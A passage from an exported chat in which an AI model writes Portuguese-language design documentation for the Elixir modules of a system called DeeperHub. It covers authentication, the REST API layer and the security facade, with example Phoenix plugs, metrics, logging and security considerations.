*   *(Configurações específicas de MFA, OAuth, RBAC, Recovery, etc., residiriam em seus respectivos prefixos, ex: `[:mfa, :totp, :issuer_name]`, `[:oauth, :google, :client_id]`)*

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Accounts`: Para buscar informações de usuário.
*   `DeeperHub.MFA`, `DeeperHub.OAuth`, `DeeperHub.Recovery`, `DeeperHub.RBAC`, `DeeperHub.Tokens`, `DeeperHub.WebAuthn`, `DeeperHub.SessionPolicy`, `DeeperHub.SecurityQuestions`.
*   `DeeperHub.Notifications` (indireta): Para enviar emails de reset de senha, alertas de MFA, etc.
*   `DeeperHub.Shared.Utils`, `DeeperHub.Shared.Encryption`.

### 8.2. Bibliotecas Externas

*   `Joken` ou `JOSE`: Para manipulação de JWTs.
*   `Comeonin`, `Argon2`, `Bcrypt`: Para hashing de senhas.
*   Bibliotecas OAuth de cliente (ex: `Assent` para Elixir).
*   Bibliotecas WebAuthn (ex: `Wax` ou `Webauthnix`).
*   Bibliotecas TOTP (ex: `ex_totp`).

## 🤝 9. Como Usar / Integração

**Em um Plug de Autenticação (Phoenix):**
```elixir
defmodule MyAppWeb.AuthPlug do
  import Plug.Conn
  alias DeeperHub.Auth

  def init(opts), do: opts

  def call(conn, _opts) do
    with [\"Bearer \" <> token] <- get_req_header(conn, \"authorization\"),
         {:ok, claims} <- Auth.validate_token(token) do
      assign(conn, :current_user_id, claims.user_id)
    else
      _ ->
        # Se não houver token ou for inválido, pode-se optar por não fazer nada
        # ou enviar um 401 se o endpoint for protegido.
        conn
        # Para endpoints protegidos:
        # conn |> send_resp(401, \"Unauthorized\") |> halt()
    end
  end
end
```

**Verificando Permissão em um Controller:**
```elixir
defmodule MyAppWeb.PostController do
  use MyAppWeb, :controller
  alias DeeperHub.Auth

  plug MyAppWeb.AuthPlug # Garante que :current_user_id está disponível

  def create(conn, params) do
    user_id = conn.assigns.current_user_id
    case Auth.authorize(user_id, :post, :create) do
      :ok ->
        # ... lógica para criar post ...
        json(conn, %{data: \"Post criado\"})
      {:error, :unauthorized} ->
        conn |> put_status(403) |> json(%{error: \"Forbidden\"})
    end
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unitários para cada serviço (`LoginService`, `SessionManager`, `TokenService`, etc.).
*   Testar cada fluxo de autenticação (senha, OAuth, WebAuthn, MFA) de ponta a ponta.
*   Testar a lógica de validação e revogação de tokens.
*   Testar a lógica de RBAC (criação de papéis, atribuição de permissões, verificação).
*   Testar os workers de limpeza.
*   Localização: `test/deeper_hub/auth/`, `test/deeper_hub/mfa/`, etc.

### 10.2. Métricas

*   `deeper_hub.auth.login.attempts.count` (tags: `method` (`password`, `oauth`, `webauthn`), `status` (`success`, `failure`, `mfa_required`))
*   `deeper_hub.auth.login.duration_ms` (Histograma, tags: `method`)
*   `deeper_hub.auth.mfa.verifications.count` (tags: `method` (`totp`, `recovery`), `status` (`success`, `failure`))
*   `deeper_hub.auth.token.generated.count` (tags: `type` (`access`, `refresh`, `api`))
*   `deeper_hub.auth.token.validated.count` (tags: `type`, `status` (`valid`, `invalid`, `expired`))
*   `deeper_hub.auth.token.revoked.count` (tags: `type`)
*   `deeper_hub.auth.session.active.gauge`: Número de sessões ativas.
*   `deeper_hub.auth.session.created.count`
*   `deeper_hub.auth.session.revoked.count`
*   `deeper_hub.auth.authorization.checks.count` (tags: `resource`, `action`, `result` (`granted`, `denied`))

### 10.3. Logs

*   **Nível INFO:** Login/logout bem-sucedido, token gerado/revogado, sessão criada/invalidada, permissão concedida.
*   **Nível WARNING:** Tentativa de login falha, token inválido/expirado, sessão inválida/expirada, permissão negada, tentativa de uso de token na blacklist.
*   **Nível ERROR:** Erros internos nos serviços de autenticação/autorização, falha ao gerar hash de senha, falha na comunicação com provedor OAuth.
*   **Logs de Auditoria (via `AuditIntegration`):** Todas as ações significativas de autenticação, autorização, mudanças de senha, configuração de MFA, etc., são registradas.

### 10.4. Telemetria

Eventos Telemetry são emitidos para operações chave:
*   `[:deeper_hub, :auth, :login, :start | :stop | :exception]`
*   `[:deeper_hub, :auth, :token, :validation, :start | :stop | :exception]`
*   `[:deeper_hub, :auth, :session, :creation, :start | :stop | :exception]`
*   `[:deeper_hub, :auth, :authorization, :check, :start | :stop | :exception]`
*   *(Eventos específicos para MFA, OAuth, RBAC, etc., dentro de seus respectivos módulos de telemetria).*

## ❌ 11. Tratamento de Erros

*   Funções de autenticação e validação retornam tuplas `{:ok, ...}` ou `{:error, reason}`.
*   Erros comuns incluem `:invalid_credentials`, `:user_locked`, `:mfa_required`, `:token_invalid`, `:token_expired`, `:session_invalid`, `:unauthorized`.
*   Falhas de comunicação com serviços externos (ex: OAuth providers) são gerenciadas com Circuit Breakers (via `Core.HTTPClient` ou adaptadores específicos) e timeouts.
*   Tentativas excessivas de login ou outras operações sensíveis são limitadas por `RateLimitIntegration`.

## 🛡️ 12. Considerações de Segurança

*   **Hashing de Senhas:** Usar algoritmos fortes e salt.
*   **Armazenamento de Tokens:** Tokens de sessão e refresh devem ser armazenados de forma segura no cliente (ex: cookies HttpOnly, Secure). Tokens de API devem ser tratados como segredos.
*   **Proteção CSRF:** Necessária para aplicações web que usam sessões baseadas em cookies.
*   **Proteção contra Enumeração de Usuários:** Respostas de login/reset não devem indicar se um usuário existe.
*   **Segurança de Tokens JWT:** Usar chaves secretas fortes, algoritmos de assinatura seguros (ex: HS256, RS256), e validar claims `exp`, `nbf`, `iat`.
*   **Rate Limiting:** Essencial para prevenir ataques de força bruta.
*   **MFA:** Fortemente recomendado para aumentar a segurança das contas.
*   **Validação de Redirecionamento OAuth:** Validar estritamente as URIs de redirecionamento.
*   **Princípio do Menor Privilégio:** Aplicado através do RBAC.
*   **Rotação de Segredos:** Chaves de assinatura JWT e outros segredos devem ser rotacionados periodicamente.

## 🧑‍💻 13. Contribuição

*   Qualquer nova funcionalidade de autenticação ou autorização deve passar por uma revisão de segurança rigorosa.
*   Siga os padrões de nomenclatura e os princípios de design estabelecidos (Fachadas, Serviços).
*   Garanta que todos os fluxos de autenticação e autorização sejam cobertos por testes.
*   Mantenha a separação de responsabilidades entre `Auth`, `MFA`, `OAuth`, `RBAC`, etc.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar Single Sign-On (SSO) com SAML 2.0 ou OpenID Connect.
*   [ ] Adicionar suporte a \"Login com Magic Link\".
*   [ ] Permitir que usuários vejam e gerenciem suas sessões ativas.
*   [ ] Implementar políticas de bloqueio de conta mais avançadas (ex: bloqueio progressivo).
*   [ ] Adicionar detecção de comprometimento de credenciais (integração com serviços como Have I Been Pwned).
*   [ ] Melhorar o gerenciamento de escopos para tokens de API e OAuth.
*   [ ] Suporte para delegação de autorização (ex: usuário permite que um aplicativo de terceiros acesse seus dados com escopo limitado).
*   [ ] Implementar revogação de tokens de refresh mais granular e eficiente.

---

*Última atualização: 2025-05-11*

---

Ufa! Esse foi denso. O módulo `Auth` é realmente um gigante.

Qual módulo você gostaria de abordar em seguida? `DeeperHub.API` ou `DeeperHub.Security` talvez? Ou algo do Core?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos para o módulo `DeeperHub.API`! Este módulo é a porta de entrada para muitas interações com o sistema DeeperHub, então sua documentação é crucial.

---

# Módulo: `DeeperHub.API` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.API`

O módulo `DeeperHub.API` é responsável por definir, gerenciar e proteger a Interface de Programação de Aplicativos (API) RESTful do sistema DeeperHub. Ele serve como o principal ponto de interação para clientes externos (aplicações web, mobile, serviços de terceiros) consumirem as funcionalidades e dados do DeeperHub.

Este módulo foca em fornecer uma API robusta, segura, versionada e bem documentada, incluindo mecanismos para limitação de taxa (Rate Limiting) e validação de requisições. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Definição de Endpoints RESTful:**
    *   Mapeamento de rotas HTTP para controllers e ações específicas.
    *   Suporte aos verbos HTTP padrão (GET, POST, PUT, PATCH, DELETE).
*   **Validação de Requisições:**
    *   Validação de parâmetros de query, path e corpo da requisição (via `DeeperHub.API.Validation.APIRequestValidator`).
    *   Validação de tipos de dados, formatos e regras de negócio.
*   **Limitação de Taxa (Rate Limiting):**
    *   Controle do número de requisições por cliente/IP/token em um determinado período (via `DeeperHub.API.RateLimit.RateLimiterFacade` e `DeeperHub.API.RateLimiter` Plug).
    *   Prevenção de abusos e sobrecarga da API.
    *   Retorno de cabeçalhos HTTP padrão para rate limiting (ex: `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `Retry-After`).
*   **Autenticação e Autorização de API (Delegação):**
    *   Integrar com `DeeperHub.Auth` para autenticar requisições (ex: via tokens de API, JWTs de sessão).
    *   Verificar se o cliente autenticado tem permissão para acessar o recurso/endpoint solicitado.
*   **Versionamento da API:**
    *   Suporte a diferentes versões da API para permitir evolução sem quebrar clientes existentes (ex: `/api/v1/...`, `/api/v2/...`).
*   **Formatação de Respostas:**
    *   Utilizar `DeeperHub.Core.APIResponder` para padronizar o formato das respostas JSON (sucesso, erro, validação).
*   **Documentação da API:**
    *   Facilitar a geração de documentação interativa (ex: OpenAPI/Swagger) a partir das definições de endpoint e schemas de validação.
*   **Tratamento de Erros da API:**
    *   Converter erros internos e de validação em respostas HTTP apropriadas e padronizadas.
*   **Gerenciamento de CORS (Cross-Origin Resource Sharing):**
    *   Configurar políticas de CORS para permitir ou restringir acesso de diferentes origens.
*   **Caching de Respostas (Opcional):**
    *   Integrar com `DeeperHub.Core.Cache` para armazenar em cache respostas de endpoints frequentemente acessados e com dados pouco voláteis.

## 🏗️ 3. Arquitetura e Design

O módulo `DeeperHub.API` normalmente reside na camada de interface do sistema, interagindo com os módulos de domínio (como `DeeperHub.Accounts`, `DeeperHub.Servers`, etc.) para processar requisições e com os módulos Core para funcionalidades transversais.

### 3.1. Componentes Principais

1.  **Router (ex: `DeeperHubWeb.Router` se usando Phoenix):**
    *   **Responsabilidade:** Define as rotas da API, mapeando URLs e métodos HTTP para os respectivos `Controllers`.
    *   **Interações:** Aplica Plugs de middleware para autenticação, rate limiting, validação, etc.
2.  **Controllers (ex: `DeeperHubWeb.API.V1.UserController`):**
    *   **Responsabilidade:** Receber requisições HTTP, extrair parâmetros, chamar os módulos de serviço/fachadas de domínio apropriados, e formatar a resposta.
    *   **Interações:**
        *   Utiliza `DeeperHub.Core.APIResponder` para formatar respostas.
        *   Chama fachadas de domínio (ex: `DeeperHub.Accounts.get_user/1`).
        *   Pode interagir com `DeeperHub.Auth.authorize/4` para verificações de permissão finas.
3.  **Plugs (Middleware):**
    *   **`DeeperHub.API.RateLimiter`:** Plug para aplicar limitação de taxa antes de atingir o controller.
    *   **`DeeperHub.API.Validation.APIRequestValidator`:** Plug para validar parâmetros da requisição contra um schema.
    *   **Plugs de Autenticação:** Para verificar tokens e carregar o usuário/cliente autenticado.
    *   **Plug de CORS:** Para gerenciar cabeçalhos CORS.
    *   **Plug de Logging de Requisição:** (ex: `DeeperHub.Logger.PhoenixIntegration.RequestLogger`) para logar detalhes de cada requisição.
4.  **`DeeperHub.API.RateLimit.RateLimiterFacade` e `DeeperHub.API.RateLimit.Registry`:**
    *   **Responsabilidade:** Fornecem a lógica de negócio e o estado para o sistema de rate limiting.
    *   **Interações:** Utilizados pelo Plug `DeeperHub.API.RateLimiter`.
5.  **`DeeperHub.API.Validation.APIRequestValidator`:**
    *   **Responsabilidade:** Fornece a lógica para validação de schemas de requisição.
    *   **Interações:** Utilizado como Plug ou diretamente pelos controllers.
6.  **Schemas de Validação (ex: em `DeeperHub.API.Validation.Schemas`):**
    *   **Responsabilidade:** Definir a estrutura esperada e as regras de validação para os dados de entrada de cada endpoint. Podem ser baseados em Ecto Changesets ou bibliotecas como `Params`.

### 3.2. Estrutura de Diretórios (Proposta com Phoenix)

```
lib/deeper_hub_web/ # (Se usando Phoenix)
├── api/
│   ├── v1/ # Para versionamento
│   │   ├── user_controller.ex
│   │   ├── server_controller.ex
│   │   └── ... (outros controllers da v1)
│   │
│   └── v2/ # Futura versão
│       └── ...
│
├── plugs/
│   ├── auth_api_token_plug.ex
│   └── ... (outros plugs customizados para a API)
│
└── router.ex # Define os pipelines e escopos da API

lib/deeper_hub/api/ # Lógica de negócio da API, independente do Phoenix
├── rate_limit/
│   ├── rate_limiter_facade.ex
│   ├── registry.ex
│   └── supervisor.ex
│
├── validation/
│   ├── api_request_validator.ex
│   └── schemas/
│       ├── user_schemas.ex
│       └── ...
│
├── rate_limiter.ex # Plug de Rate Limit (se não estiver em _web)
└── supervisor.ex   # Supervisor para os GenServers de RateLimit
```

### 3.3. Decisões de Design Importantes

*   **Stateless API:** A API deve ser o mais stateless possível, com o estado do cliente gerenciado por tokens.
*   **Versionamento:** O versionamento da API (ex: no path `/api/v1/`) é crucial para permitir atualizações e novas funcionalidades sem quebrar integrações existentes.
*   **Validação na Entrada:** Todas as entradas devem ser rigorosamente validadas o mais cedo possível no ciclo da requisição para garantir a integridade dos dados e proteger contra payloads maliciosos.
*   **Padronização de Respostas:** Usar um formato consistente para todas as respostas (sucesso e erro) melhora a experiência do desenvolvedor que consome a API.
*   **Segurança como Prioridade:** Autenticação, autorização, rate limiting e outras medidas de segurança devem ser aplicadas de forma robusta.

## 🛠️ 4. Casos de Uso Principais

*   **Cliente Web Obtém Lista de Servidores:**
    *   O frontend envia um `GET /api/v1/servers?tag=pvp&page=2`.
    *   A requisição passa por Plugs de autenticação (opcional), rate limiting.
    *   `ServerController.index/2` é chamado.
    *   O controller valida os parâmetros de query.
    *   Chama `DeeperHub.Servers.list_servers(%{tag: \"pvp\", page: 2})`.
    *   Formata a resposta usando `APIResponder.format_success/3` e retorna JSON.
*   **Aplicativo Mobile Cria um Novo Usuário:**
    *   O app envia `POST /api/v1/users` com dados do usuário no corpo.
    *   Plugs de rate limiting e `APIRequestValidator` (para o corpo) são executados.
    *   `UserController.create/2` é chamado.
    *   Chama `DeeperHub.Accounts.register_user(params)`.
    *   Retorna uma resposta de sucesso (201 Created) ou erro de validação (422).
*   **Serviço Externo Atualiza Status (com Token de API):**
    *   Serviço envia `PUT /api/v1/services/{service_id}/status` com header `Authorization: Bearer <api_token>`.
    *   Plug de autenticação de API valida o token.
    *   Rate limiting específico para tokens de API é aplicado.
    *   Controller apropriado verifica permissões do token e atualiza o status.

## 🌊 5. Fluxos Importantes

### Fluxo de uma Requisição API Típica (com Phoenix)

1.  **Requisição HTTP:** Cliente envia requisição (ex: `GET /api/v1/me`).
2.  **Endpoint Phoenix:** Recebe a requisição.
3.  **Pipeline de Plugs (definido no Router):**
    *   `Plug.Telemetry`: Inicia telemetria da requisição.
    *   `Plug.Parsers`: Parseia o corpo da requisição (se houver).
    *   `MyAppWeb.Plugs.AuthApiTokenPlug` (ou similar): Verifica o token de autenticação no header, carrega `current_user_id` ou `current_client_id`. Se falhar, pode retornar 401.
    *   `DeeperHub.API.RateLimiter`: Verifica se a requisição excede os limites de taxa. Se sim, retorna 429.
    *   `DeeperHub.API.Validation.APIRequestValidator` (se configurado para a rota): Valida parâmetros de query/corpo. Se falhar, retorna 422.
    *   Outros plugs (CORS, etc.).
4.  **Router Phoenix:** Direciona a requisição para o Controller e Ação apropriados (ex: `UserController.show_me/2`).
5.  **Controller (`UserController.show_me/2`):**
    *   Obtém `current_user_id` da `conn.assigns`.
    *   Chama o serviço de domínio: `DeeperHub.Accounts.get_user(current_user_id)`.
    *   Recebe a resposta do serviço (`{:ok, user}` ou `{:error, reason}`).
    *   Usa `DeeperHub.Core.APIResponder` para formatar a resposta JSON.
        *   Ex: `APIResponder.format_success(user_data_map)` ou `APIResponder.format_error(reason)`.
    *   Envia a resposta para o cliente com o status HTTP apropriado (ex: `json(conn, formated_response)`).
6.  **Plug.Telemetry (Saída):** Finaliza a telemetria da requisição.

## 📡 6. API (Endpoints RESTful)

Esta seção deve detalhar os principais endpoints da API. Dada a natureza genérica deste módulo, os endpoints específicos seriam definidos pelos módulos de domínio que expõem funcionalidades via API. No entanto, o módulo `API` define *como* esses endpoints são estruturados e protegidos.

**Exemplo de Definição de um Grupo de Endpoints (conceptual):**

### `GET /api/v1/users/{user_id}`

*   **Descrição:** Retorna os detalhes de um usuário específico.
*   **Autenticação:** Requer token de acesso válido (sessão ou API).
*   **Autorização:** O usuário solicitante deve ter permissão para ver o perfil do `user_id` (ex: ser o próprio usuário ou um administrador).
*   **Parâmetros de Caminho:**
    *   `user_id` (string, UUID): ID do usuário a ser buscado.
*   **Resposta de Sucesso (200 OK):**
    ```json
    {
      \"status\": \"success\",
      \"data\": {
        \"id\": \"uuid-user-123\",
        \"email\": \"user@example.com\", // Pode ser omitido dependendo das permissões
        \"profile\": {
          \"full_name\": \"John Doe\",
          \"bio\": \"Developer\"
        }
      },
      \"message\": null,
      \"meta\": null
    }
    ```
*   **Respostas de Erro:**
    *   `401 Unauthorized`: Token inválido ou ausente.
    *   `403 Forbidden`: Usuário autenticado não tem permissão.
    *   `404 Not Found`: Usuário não encontrado.
    *   `429 Too Many Requests`: Limite de taxa excedido.

*(Esta seção seria populada com os endpoints reais à medida que são definidos).*

## ⚙️ 7. Configuração

Configurações gerenciadas pelo `DeeperHub.Core.ConfigManager`:

*   **Rate Limiting (prefixo: `[:api, :rate_limit, <endpoint_key>]`):**
    *   `... :limit` (Integer): Número máximo de requisições.
    *   `... :window_seconds` (Integer): Janela de tempo em segundos.
    *   `... :block_seconds` (Integer): Duração do bloqueio após exceder o limite.
    *   Exemplo: `[:api, :rate_limit, :users_index, :limit] = 100`
*   **Validação (geralmente por schema, não globalmente no ConfigManager para APIRequestValidator):**
    *   `[:api, :validation, :strict_mode_enabled]` (Boolean): Se `APIRequestValidator` deve rejeitar campos desconhecidos. (Padrão: `true`)
*   **Versionamento:**
    *   `[:api, :default_version]` (String): Versão padrão da API se nenhuma for especificada (ex: `\"v1\"`).
    *   `[:api, :supported_versions]` (List de Strings): Lista de versões da API atualmente suportadas.
*   **CORS:**
    *   `[:api, :cors, :origins]` (List de Strings ou Regex): Origens permitidas.
    *   `[:api, :cors, :methods]` (List de Strings): Métodos HTTP permitidos.
    *   `[:api, :cors, :headers]` (List de Strings): Cabeçalhos permitidos.
*   **Documentação:**
    *   `[:api, :docs, :openapi_spec_path]` (String): Caminho para o arquivo de especificação OpenAPI.
    *   `[:api, :docs, :ui_enabled]` (Boolean): Habilita a UI do Swagger/OpenAPI.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configurações de rate limiting, versionamento, etc.
*   `DeeperHub.Core.APIResponder`: Para padronizar respostas.
*   `DeeperHub.Core.Logger`: Para logging de requisições e erros.
*   `DeeperHub.Core.Metrics`: Para métricas de API (latência, taxa de erro, etc.).
*   `DeeperHub.Auth`: Para autenticação e autorização de requisições.
*   Módulos de domínio (ex: `DeeperHub.Accounts`, `DeeperHub.Servers`): Para acessar a lógica de negócio.

### 8.2. Bibliotecas Externas

*   `Phoenix` (se for o framework web): Para routing, controllers, plugs.
*   `Jason`: Para manipulação de JSON.
*   `Plug` (Elixir): Para a arquitetura de middleware.
*   Bibliotecas de validação de parâmetros (ex: `Params`, `Ecto.Changeset` para validação de corpo).
*   Bibliotecas de OpenAPI/Swagger para geração de documentação (ex: `OpenApiSpex`).

## 🤝 9. Como Usar / Integração

*   **Consumidores da API:** Devem seguir a documentação da API (idealmente gerada por OpenAPI) para entender os endpoints, formatos de requisição/resposta e autenticação.
*   **Desenvolvedores do DeeperHub:**
    *   Ao adicionar novos endpoints, definir rotas no Router.
    *   Criar Controllers para lidar com a lógica da requisição.
    *   Definir schemas de validação para os dados de entrada usando `DeeperHub.API.Validation.APIRequestValidator` ou similar.
    *   Configurar regras de rate limiting para os novos endpoints em `DeeperHub.API.RateLimiter`.
    *   Utilizar `DeeperHub.Core.APIResponder` para formatar todas as respostas.
    *   Integrar com `DeeperHub.Auth` para proteger os endpoints.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   **Testes de Integração/Controlador:** Para cada endpoint, testar:
    *   Respostas de sucesso (2xx).
    *   Erros de validação de entrada (422).
    *   Erros de autenticação (401).
    *   Erros de autorização (403).
    *   Recurso não encontrado (404).
    *   Rate limiting (429).
    *   Formato correto da resposta JSON.
*   **Testes de Plugs:** Testes unitários para plugs customizados (rate limiter, validador).
*   Localização: `test/deeper_hub_web/api/v1/` (para controllers), `test/deeper_hub/api/` (para lógica de negócio da API).

### 10.2. Métricas

*   `deeper_hub.api.http.requests.total` (Contador, tags: `path`, `method`, `status_code`): Número total de requisições.
*   `deeper_hub.api.http.requests.duration_ms` (Histograma, tags: `path`, `method`): Latência das requisições.
*   `deeper_hub.api.rate_limit.throttled.count` (Contador, tags: `path`, `client_id`): Número de requisições bloqueadas por rate limiting.
*   `deeper_hub.api.validation.errors.count` (Contador, tags: `path`, `field`): Número de erros de validação.

### 10.3. Logs

*   Cada requisição HTTP deve ser logada (via `RequestLogger`), incluindo método, path, status code, duração, IP do cliente, user_id (se autenticado).
*   Erros de validação e exceções nos controllers devem ser logados com detalhes.

### 10.4. Telemetria

Phoenix já emite muitos eventos de telemetria para o ciclo de vida da requisição. O módulo `API` pode adicionar eventos específicos:
*   `[:deeper_hub, :api, :rate_limit, :exceeded]`
    *   Metadados: `%{path: path, client_id: id, limit: limit, window: window}`
*   `[:deeper_hub, :api, :validation, :failed]`
    *   Metadados: `%{path: path, errors: errors_map}`

## ❌ 11. Tratamento de Erros

*   Utilizar `DeeperHub.Core.APIResponder` para garantir que todas as respostas de erro sigam um formato padronizado (ex: JSON:API error objects).
*   Mapear exceções comuns (ex: `Ecto.NoResultsError` para 404, erros de autorização para 403) para os status HTTP corretos.
*   Evitar vazar detalhes internos do sistema (stack traces) em respostas de erro para o cliente em ambiente de produção.

## 🛡️ 12. Considerações de Segurança

*   **Autenticação e Autorização:** Todos os endpoints (exceto os explicitamente públicos) devem ser protegidos.
*   **Validação de Entrada:** Validar *todos* os dados provenientes do cliente.
*   **Rate Limiting:** Essencial para prevenir abuso.
*   **Sanitização de Saída:** Embora geralmente o `APIResponder` lide com JSON, garantir que nenhum dado sensível ou script seja inadvertidamente incluído em respostas.
*   **Segurança de Cabeçalhos:** Usar cabeçalhos de segurança HTTP apropriados (CSP, HSTS, X-Frame-Options, etc.), geralmente configurados no nível do endpoint web.
*   **Proteção contra Ataques Comuns:** CSRF (para APIs baseadas em sessão/cookie), XSS (se a API retorna HTML ou permite upload de conteúdo que é renderizado), Injeção de SQL (prevenindo na camada de serviço/dados).
*   **Gerenciamento de Tokens de API:** Tokens de API devem ser tratados como segredos, ter escopos limitados e permitir revogação.

## 🧑‍💻 13. Contribuição

*   Ao adicionar novos endpoints, siga o padrão RESTful.
*   Documente os endpoints usando o padrão OpenAPI/Swagger.
*   Adicione schemas de validação para todas as novas requisições.
*   Configure regras de rate limiting apropriadas.
*   Escreva testes de integração abrangentes.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de quotas de API mais granular (além do rate limiting básico).
*   [ ] Adicionar suporte para WebSockets ou Server-Sent Events (SSE) para comunicação em tempo real, se necessário.
*   [ ] Melhorar a geração automática de documentação OpenAPI a partir do código.
*   [ ] Integrar com um API Gateway para gerenciamento mais avançado (ex: Kong, Tyk).
*   [ ] Adicionar suporte para negociação de conteúdo (ex: `Accept` header para diferentes formatos de resposta, embora JSON seja o principal).
*   [ ] Implementar caching de respostas HTTP (ETags, Cache-Control) para endpoints apropriados.

---

*Última atualização: 2025-05-11*

---

Este README para o `DeeperHub.API` tenta cobrir os aspectos de definição, proteção e gerenciamento da API.

Qual o próximo módulo? `DeeperHub.Security` seria uma boa continuação, dado que muitos aspectos da API dependem dele."""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos agora mergulhar no `DeeperHub.Security`, um módulo guarda-chuva que coordena diversas funcionalidades de segurança cruciais para a robustez do DeeperHub.

---

# Módulo: `DeeperHub.Security` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security`

O módulo `DeeperHub.Security` é a fachada principal e o ponto de coordenação para todas as funcionalidades de segurança proativa e reativa no sistema DeeperHub. Ele não implementa diretamente todas as lógicas de segurança, mas delega e orquestra um conjunto de submódulos e serviços especializados para proteger a aplicação contra uma variedade de ameaças, gerenciar riscos e garantir a integridade e confidencialidade dos dados.

Este módulo abrange desde a proteção contra ataques comuns (XSS, CSRF, Injeção de SQL, DDoS, Força Bruta) até mecanismos mais avançados como detecção de fraude, análise comportamental, criptografia e gerenciamento de dispositivos e localizações seguras. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

O `DeeperHub.Security` atua principalmente como uma **fachada de alto nível**, delegando para os seguintes submódulos (que podem ter suas próprias fachadas e serviços):

*   **`DeeperHub.Security.FraudDetection`:**
    *   Análise de transações, logins, mudanças de perfil e uso de API para detectar fraudes.
    *   Gerenciamento de regras de detecção e pontuação de risco de fraude.
*   **`DeeperHub.Security.BruteForceProtection`:**
    *   Monitoramento e bloqueio de tentativas excessivas de acesso (ex: login, recuperação de senha).
    *   Requisição de CAPTCHA.
*   **`DeeperHub.Security.CsrfProtection`:**
    *   Geração e validação de tokens CSRF para proteger contra ataques de falsificação de solicitação entre sites.
*   **`DeeperHub.Security.DdosProtection`:**
    *   Mitigação de ataques de Negação de Serviço Distribuída através de limitação de taxa e bloqueio de IPs.
*   **`DeeperHub.Security.SqlInjectionProtection`:**
    *   Verificação e sanitização de entradas para prevenir ataques de Injeção de SQL.
*   **`DeeperHub.Security.XssProtection`:**
    *   Verificação e sanitização de entradas e saídas para prevenir ataques de Cross-Site Scripting.
*   **`DeeperHub.Security.PathTraversalProtection`:**
    *   Prevenção de acesso não autorizado a arquivos e diretórios.
*   **`DeeperHub.Security.RiskAssessment`:**
    *   Avaliação de risco para diversas operações e contextos.
    *   Cálculo de pontuações de risco e recomendação de ações.
*   **`DeeperHub.Security.BehavioralAnalysis`:**
    *   Análise do comportamento do usuário para detectar anomalias e desvios.
    *   Criação e manutenção de perfis comportamentais.
*   **`DeeperHub.Security.DeviceFingerprint` & `DeviceService` (parte de `SecurityManager` ou submódulo próprio):**
    *   Gerenciamento de dispositivos confiáveis e bloqueados.
    *   Geração e comparação de \"fingerprints\" de dispositivos.
*   **`DeeperHub.Security.GeoLocationService` (ou `LoginLocation`):**
    *   Verificação de localização de login, detecção de viagens impossíveis.
*   **`DeeperHub.Security.AtRestEncryptionService` (usando `Core.EncryptionService`):**
    *   Garantir que dados sensíveis sejam criptografados em repouso.
*   **`DeeperHub.Security.LogSanitizer` & `ResponseSanitizer`:**
    *   Remoção/mascaramento de dados sensíveis de logs e respostas de API.
*   **`DeeperHub.Security.AdminAuth` (se distinto de `DeeperHub.Auth` para admin):**
    *   Autenticação e autorização específicas para a interface de administração.
*   **`DeeperHub.Security.Policy.SecurityPolicyManager`:**
    *   Gerenciamento centralizado de todas as políticas de segurança com controle de acesso RBAC.
*   **Monitoramento e Alertas de Segurança (via `DeeperHub.Security.Monitoring`):**
    *   Registro de eventos de segurança e geração de alertas.

**Funcionalidades Coordenadas pela Fachada `DeeperHub.Security`:**

*   Fornecer um ponto de entrada para verificações de segurança gerais (ex: `DeeperHub.Security.is_request_safe?(conn)`).
*   Orquestrar múltiplas verificações de segurança para uma determinada operação.
*   Consolidar e reportar o estado de segurança geral do sistema.
*   Gerenciar a inicialização e configuração dos submódulos de segurança.

## 🏗️ 3. Arquitetura e Design

O `DeeperHub.Security` é projetado como um módulo coordenador. Sua principal função é delegar para os módulos especializados.

### 3.1. Componentes Principais

*   **`DeeperHub.Security` (Fachada Pública):** Ponto de entrada.
*   **Submódulos Especializados:** Como listados acima (`FraudDetection`, `BruteForceProtection`, etc.). Cada um destes terá sua própria arquitetura interna (fachadas, serviços, workers, schemas).
*   **`DeeperHub.Security.SecurityManager` (GenServer ou Serviço Coordenador):**
    *   Pode ser o componente que a fachada `DeeperHub.Security` realmente chama.
    *   Responsável por orquestrar chamadas para múltiplos submódulos de segurança quando uma avaliação de segurança abrangente é necessária.
    *   Pode manter um estado agregado sobre a postura de segurança do sistema.
*   **`DeeperHub.Security.Policy.SecurityPolicyManager`:**
    *   Serviço central para definir e aplicar todas as políticas de segurança (ex: quando bloquear um IP, qual o threshold para fraude, etc.). Ele interage com o `Core.ConfigManager` mas fornece uma camada de abstração e validação específica para políticas de segurança.
*   **`DeeperHub.Security.Cache.SecurityCache`:**
    *   Cache para dados frequentemente acessados pelos módulos de segurança (IPs bloqueados, regras, etc.).
*   **`DeeperHub.Security.Integrations.EventIntegration`:**
    *   Publica eventos de segurança significativos (ex: `ip_blocked`, `fraud_detected`).
*   **`DeeperHub.Security.Integrations.AuditIntegration` (pode estar dentro de cada submódulo):**
    *   Registra ações e detecções de segurança no `DeeperHub.Audit`.
*   **`DeeperHub.Security.Supervisor` e `UnifiedSupervisor`:**
    *   Supervisionam todos os processos e workers dos submódulos de segurança.

### 3.2. Estrutura de Diretórios (Alto Nível)

```
lib/deeper_hub/security/
├── security.ex                       # Fachada Pública do módulo Security
├── security_manager.ex               # Serviço Coordenador
│
├── admin_auth/                       # Autenticação de Admin
│   └── ...
├── behavioral_analysis/              # Análise Comportamental
│   └── ...
├── brute_force_protection/           # Proteção contra Força Bruta
│   └── ...
├── cache/                            # Cache específico de Segurança
